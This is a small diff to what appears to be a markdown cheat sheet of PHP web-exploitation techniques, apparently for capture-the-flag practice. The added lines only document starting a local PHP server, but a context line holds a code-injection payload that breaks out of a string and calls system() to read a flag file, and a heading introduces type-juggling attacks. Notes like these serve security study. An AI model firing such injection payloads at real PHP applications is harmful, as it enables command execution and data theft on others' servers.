@@ -18,6 +18,12 @@
 flag','..')+or+system('cat+templates/flag.php');//
 ```
 
+# server
+
+```bash
+php -S localhost:8000
+```
+
 # type juggling, weak comparison, magic hashes
 
 ```php
